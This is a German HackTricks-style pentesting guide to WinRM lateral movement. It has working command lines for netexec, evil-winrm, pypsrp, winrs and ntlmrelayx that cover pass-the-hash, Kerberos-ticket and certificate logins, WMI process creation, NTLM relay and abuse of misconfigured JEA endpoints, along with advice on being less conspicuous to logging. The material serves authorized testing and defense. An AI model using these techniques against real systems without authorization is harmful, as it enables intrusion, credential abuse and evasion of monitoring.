# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM ist in Windows-Umgebungen eines der praktischsten Transportmittel für **lateral movement**, da es eine Remote-Shell über **WS-Man/HTTP(S)** ermöglicht, ohne Tricks zur Erstellung von SMB-Diensten zu benötigen. Wenn das Ziel **5985/5986** verfügbar macht und dein Principal Remoting verwenden darf, kannst du oft sehr schnell von „valid creds“ zu einer „interactive shell“ gelangen.

Informationen zur **Protokoll-/Dienstaufzählung**, zu Listenern, zum Aktivieren von WinRM, zu `Invoke-Command` und zur allgemeinen Client-Verwendung findest du hier:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Warum Operatoren WinRM schätzen

- Verwendet **HTTP/HTTPS** statt SMB/RPC und funktioniert daher oft auch dort, wo die Ausführung im PsExec-Stil blockiert wird.
- Mit **Kerberos** werden keine wiederverwendbaren Zugangsdaten an das Ziel gesendet.
- Funktioniert problemlos mit Tools für **Windows**, **Linux** und **Python** (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- Der interaktive PowerShell-Remoting-Pfad startet auf dem Ziel **`wsmprovhost.exe`** im Kontext des authentifizierten Benutzers. Das unterscheidet sich operativ von der dienstbasierten Ausführung.

## Zugriffsmodell und Voraussetzungen

In der Praxis hängt erfolgreiches WinRM-lateral movement von **drei** Dingen ab:

1. Das Ziel verfügt über einen **WinRM-Listener** (`5985`/`5986`) und Firewallregeln, die den Zugriff zulassen.
2. Das Konto kann sich am Endpunkt **authentifizieren**.
3. Das Konto darf eine **Remoting-Sitzung öffnen**.

Häufige Möglichkeiten, diesen Zugriff zu erhalten:

- **Lokaler Administrator** auf dem Ziel.
- Mitgliedschaft in **Remote Management Users** auf neueren Systemen oder in **WinRMRemoteWMIUsers__** auf Systemen/Komponenten, die diese Gruppe noch berücksichtigen.
- Explizit delegierte Remoting-Rechte über lokale Sicherheitsdeskriptoren / Änderungen an PowerShell-Remoting-ACLs.

Wenn du bereits einen Rechner mit Administratorrechten kontrollierst, kannst du den WinRM-Zugriff auch **ohne Mitgliedschaft in einer vollständigen Administratorgruppe delegieren**. Die entsprechenden Techniken werden hier beschrieben:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Wichtige Authentifizierungsfallen bei lateral movement

- **Kerberos erfordert einen Hostnamen/FQDN**. Wenn du dich per IP verbindest, wechselt der Client normalerweise zu **NTLM/Negotiate**.
- In **Workgroup**- oder Cross-Trust-Sonderfällen erfordert NTLM üblicherweise entweder **HTTPS** oder dass das Ziel auf dem Client zu **TrustedHosts** hinzugefügt wird.
- Bei der Verwendung lokaler Konten über Negotiate in einer Workgroup können UAC-Remoteeinschränkungen den Zugriff verhindern, sofern nicht das integrierte Administratorkonto verwendet oder `LocalAccountTokenFilterPolicy=1` gesetzt wird.
- PowerShell Remoting verwendet standardmäßig den **`HTTP/<host>`-SPN**. Wenn `HTTP/<host>` in der Umgebung bereits für ein anderes Dienstkonto registriert ist, kann WinRM Kerberos mit `0x80090322` fehlschlagen. Verwende dann einen SPN mit Portangabe oder wechsle zu **`WSMAN/<host>`**, sofern dieser SPN vorhanden ist.<sup>[[3]](#references)</sup>

Wenn du beim Password Spraying gültige Zugangsdaten findest, ist die Überprüfung über WinRM oft der schnellste Weg, um festzustellen, ob sie Zugriff auf eine Shell ermöglichen:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Lateral movement von Linux zu Windows

### NetExec / CrackMapExec zur Validierung und einmaligen Ausführung

```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```

### Evil-WinRM für interaktive Shells

`evil-winrm` ist unter Linux weiterhin die bequemste interaktive Option, da es **Passwörter**, **NT-Hashes**, **Kerberos-Tickets**, **Client-Zertifikate**, Dateiübertragungen und das Laden von PowerShell/.NET im Speicher unterstützt.

```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```

### Kerberos-SPN-Sonderfall: `HTTP` vs. `WSMAN`

Wenn der standardmäßige **`HTTP/<host>`**-SPN zu Kerberos-Fehlern führt, versuche stattdessen, ein **`WSMAN/<host>`**-Ticket anzufordern/zu verwenden. Das kommt offenbar in gehärteten oder ungewöhnlichen Unternehmensumgebungen vor, in denen **`HTTP/<host>`** bereits einem anderen Dienstkonto zugeordnet ist.<sup>[[3]](#references)</sup>

```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```

Dies ist auch nach dem Missbrauch von **RBCD / S4U** nützlich, wenn du gezielt ein **WSMAN**-Service-Ticket statt eines generischen `HTTP`-Tickets gefälscht oder angefordert hast.

### Zertifikatbasierte Authentifizierung

WinRM unterstützt auch die **Clientzertifikatauthentifizierung**, aber das Zertifikat muss auf dem Ziel einem **lokalen Konto** zugeordnet sein. Aus offensiver Sicht ist das relevant, wenn:

- du bereits ein gültiges Clientzertifikat und den privaten Schlüssel gestohlen/exportiert hast, die für WinRM zugeordnet sind;
- du **AD CS / Pass-the-Certificate** missbraucht hast, um ein Zertifikat für einen Principal zu erhalten, und dann in einen anderen Authentifizierungspfad wechselst;
- du in Umgebungen arbeitest, die bewusst auf Remoting mit passwortbasierter Authentifizierung verzichten.

```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```

Clientzertifikatbasierter WinRM ist deutlich weniger verbreitet als Passwort-/Hash-/Kerberos-Authentifizierung. Wenn er jedoch verfügbar ist, kann er einen **passwortlosen lateral movement**-Pfad bieten, der auch nach einer Passwortrotation bestehen bleibt.

### Python / Automatisierung mit `pypsrp`

Wenn du statt einer Operator-Shell Automatisierung benötigst, bietet `pypsrp` WinRM/PSRP aus Python mit Unterstützung für **NTLM**, **Zertifikatauthentifizierung**, **Kerberos** und **CredSSP**.<sup>[[2]](#references)</sup>

```python
from pypsrp.client import Client

client = Client(
    "srv01.domain.local",
    username="DOMAIN\\user",
    password="Password123!",
    ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```


Wenn Sie eine genauere Kontrolle als mit dem High-Level-Wrapper `Client` benötigen, sind die APIs `WSMan` + `RunspacePool` auf niedrigerer Ebene für zwei häufige Probleme von Operatoren nützlich:

- **`WSMAN`** als Kerberos-Dienst/SPN erzwingen, statt der standardmäßigen Erwartung von `HTTP`, die viele PowerShell-Clients verwenden;
- eine Verbindung zu einem **PSRP-Endpunkt ohne Standardkonfiguration** herstellen, z. B. einer **JEA**- oder benutzerdefinierten Sitzungskonfiguration, statt zu `Microsoft.PowerShell`.

```python
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

wsman = WSMan(
    "srv01.domain.local",
    auth="kerberos",
    ssl=False,
    negotiate_service="WSMAN",
)

with wsman, RunspacePool(wsman, configuration_name="MyJEAEndpoint") as pool, PowerShell(pool) as ps:
    ps.add_script("whoami; Get-Command")
    output = ps.invoke()
    print(output)
```

### Benutzerdefinierte PSRP-Endpunkte und JEA sind bei lateral movement wichtig

Eine erfolgreiche WinRM-Authentifizierung bedeutet **nicht** immer, dass du beim standardmäßigen, uneingeschränkten `Microsoft.PowerShell`-Endpunkt landest. In ausgereiften Umgebungen können **benutzerdefinierte Sitzungskonfigurationen** oder **JEA**-Endpunkte mit eigenen ACLs und Run-as-Verhalten verfügbar sein.<sup>[[1]](#references)</sup>

Wenn du bereits code execution auf einem Windows-Host hast und herausfinden möchtest, welche Remoting-Oberflächen verfügbar sind, liste die registrierten Endpunkte auf:

```powershell
Get-PSSessionConfiguration | Select-Object Name, Permission
```

Wenn ein nützlicher Endpoint vorhanden ist, ziele explizit auf ihn statt auf die Standard-Shell:

```powershell
Enter-PSSession -ComputerName srv01.domain.local -ConfigurationName MyJEAEndpoint
```

Praktische offensive Auswirkungen:

- Ein **eingeschränkter** Endpoint kann für Lateral Movement ausreichen, wenn er genau die richtigen Cmdlets/Funktionen für die Dienststeuerung, den Dateizugriff, die Prozesserstellung oder die Ausführung beliebiger .NET- oder externer Befehle bereitstellt.
- Eine **falsch konfigurierte JEA**-Rolle ist besonders wertvoll, wenn sie gefährliche Befehle wie `Start-Process`, weit gefasste Wildcards, beschreibbare Provider oder benutzerdefinierte Proxy-Funktionen bereitstellt, mit denen sich die vorgesehenen Einschränkungen umgehen lassen.
- Endpoints, die auf **RunAs virtual accounts** oder **gMSAs** basieren, ändern den effektiven Sicherheitskontext der ausgeführten Befehle. Insbesondere kann ein auf einer gMSA basierender Endpoint beim zweiten Hop eine **Netzwerkidentität** bereitstellen, selbst wenn eine normale WinRM-Sitzung am klassischen Delegationsproblem scheitern würde.

Prüfe bei einem benutzerdefinierten eingeschränkten Endpoint die effektiven Befehls- und Skriptberechtigungen getrennt: Eine kurze `Get-Command`-Liste allein beweist nicht, dass ein vorhandenes `.ps1` nicht ausgeführt werden kann. [JEA role capabilities](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/role-capabilities) legen ausdrücklich fest, welche Skriptpfade aufgerufen werden können; andere benutzerdefinierte Endpoints können abweichende Sitzungsregeln anwenden. Wenn ein erlaubtes Skript einen gespeicherten `SecureString` verwendet, um Anmeldedaten für einen anderen Host zu erstellen, nutzt ein Blob ohne expliziten Schlüssel [Windows DPAPI](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) und benötigt für die Entschlüsselung im Allgemeinen den schützenden Benutzer- und Computerkontext. Prüfe die ACL des Skripts, den erlaubten Aufruf, die Run-as-Identität und die Berechtigungen der Anmeldedaten auf dem nachgelagerten System, bevor du beschreibbaren Quellcode oder einen kopierten Blob als hostübergreifenden Eskalationspfad einstufst. Gib den geschützten Wert bei einer passiven Enumeration nicht aus.

Prüfe bei einer benutzerdefinierten JEA-Funktion, die einen Dateipfad akzeptiert, gemeinsam die ACL des registrierten Endpoints, die zugeordnete Rollenkonfiguration und die effektive Run-as-Identität. Ein Aufrufer kann `NoLanguage` verwenden, während der Funktionskörper im standardmäßigen Sprachmodus des Systems ausgeführt wird; ein virtuelles Konto kann außerdem lokale Administratorrechte haben. Wenn die Funktion ein zulässiges Verzeichnis anhand eines einfachen Zeichenfolgenpräfixes prüft und anschließend den angegebenen Pfad liest, können `..`-Komponenten außerhalb dieses Verzeichnisses aufgelöst werden. Maßgeblich ist der aufgelöste Pfad unter der Identität der Funktion, nicht der Sprachmodus des Aufrufers oder das scheinbare Präfix. Bestätige die erreichbare Funktion und ihre Prüfung des endgültigen Pfads, bevor du eine lesbare `.psrc`- oder `.pssc`-Datei als privilegierten Dateizugriffsbefund einstufst. Siehe die Leitlinien von Microsoft zu [JEA role capability](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/role-capabilities) und [security considerations](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations).

## Windows-native WinRM-Lateral-Movement

### `winrs.exe`

`winrs.exe` ist integriert und nützlich, wenn du **native WinRM-Befehlsausführung** nutzen möchtest, ohne eine interaktive PowerShell-Remoting-Sitzung zu öffnen:

```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```

Zwei Flags werden leicht vergessen und sind in der Praxis wichtig:

- `/noprofile` ist oft erforderlich, wenn der Remote-Principal **kein lokaler Administrator** ist.
- `/allowdelegate` ermöglicht es der Remote-Shell, deine Anmeldedaten für den Zugriff auf einen **dritten Host** zu verwenden (z. B. wenn der Befehl `\\fileserver\share` benötigt).

```cmd
winrs -r:srv01.domain.local /noprofile cmd /c set
winrs -r:srv01.domain.local /allowdelegate cmd /c dir \\fileserver.domain.local\share
```

In der Praxis führt `winrs.exe` häufig zu einer Remote-Prozesskette ähnlich der folgenden:

```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```

Das sollte man sich merken, da es sich von service-based exec und interaktiven PSRP-Sitzungen unterscheidet.

### `winrm.cmd` / WS-Man COM statt PowerShell remoting

Sie können auch über den **WinRM-Transport** Befehle ausführen, ohne `Enter-PSSession` zu verwenden, indem Sie WMI-Klassen über WS-Man aufrufen. Dabei bleibt WinRM der Transport, während **WMI `Win32_Process.Create`** als Primitive für die Remote-Ausführung dient:

```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```

Dieser Ansatz ist nützlich, wenn:

- PowerShell logging stark überwacht wird.
- Du **WinRM transport** verwenden möchtest, aber keinen klassischen PS-remoting-Workflow.
- Du eigene Tools rund um das COM-Objekt **`WSMan.Automation`** entwickelst oder verwendest.

## NTLM relay zu WinRM (WS-Man)

Wenn SMB relay durch Signing blockiert wird und LDAP relay eingeschränkt ist, kann **WS-Man/WinRM** weiterhin ein attraktives Relay-Ziel sein. Moderne Versionen von `ntlmrelayx.py` enthalten **WinRM relay servers** und können an **`wsman://`**- oder **`winrms://`**-Ziele weiterleiten.

```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```

Zwei praktische Hinweise:

- Relay ist am nützlichsten, wenn das Ziel **NTLM** akzeptiert und der weitergeleitete Principal WinRM verwenden darf.
- Neuerer Impacket-Code verarbeitet **`WSMANIDENTIFY: unauthenticated`**-Anfragen gezielt, sodass Probeabfragen im Stil von `Test-WSMan` den Relay-Ablauf nicht unterbrechen.

Informationen zu Einschränkungen bei mehreren Hops nach dem Aufbau einer ersten WinRM-Sitzung findest du hier:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## OPSEC- und Erkennungshinweise

- **Interaktives PowerShell-Remoting** erstellt auf dem Ziel normalerweise **`wsmprovhost.exe`**.
- **`winrs.exe`** erstellt häufig **`winrshost.exe`** und anschließend den angeforderten untergeordneten Prozess.
- Benutzerdefinierte **JEA**-Endpunkte führen Aktionen möglicherweise als virtuelle Konten vom Typ **`WinRM_VA_*`** oder als konfiguriertes **gMSA** aus. Dadurch ändern sich sowohl die Telemetrie als auch das Verhalten beim zweiten Hop im Vergleich zu einer Shell im Kontext eines normalen Benutzers.<sup>[[1]](#references)</sup>
- Rechne mit Telemetrie zu Netzwerkanmeldungen, WinRM-Dienstereignissen und PowerShell-Operational- bzw. Script-Block-Logging, wenn du PSRP statt rohem `cmd.exe` verwendest.
- Wenn du nur einen einzelnen Befehl brauchst, sind `winrs.exe` oder eine einmalige WinRM-Ausführung möglicherweise unauffälliger als eine länger laufende interaktive Remoting-Sitzung.
- Wenn Kerberos verfügbar ist, bevorzuge **FQDN + Kerberos** gegenüber IP + NTLM, um sowohl Vertrauensprobleme als auch umständliche Änderungen an `TrustedHosts` auf Clientseite zu reduzieren.

## References

- [1] [Microsoft: JEA-Sicherheitsüberlegungen](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations?view=powershell-7.6)
- [2] [pypsrp README](https://github.com/jborean93/pypsrp)
- [3] [Microsoft: Fehler `0x80090322` beim Verbinden von PowerShell mit einem Remoteserver über WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)
{{#include ../../banners/hacktricks-training.md}}
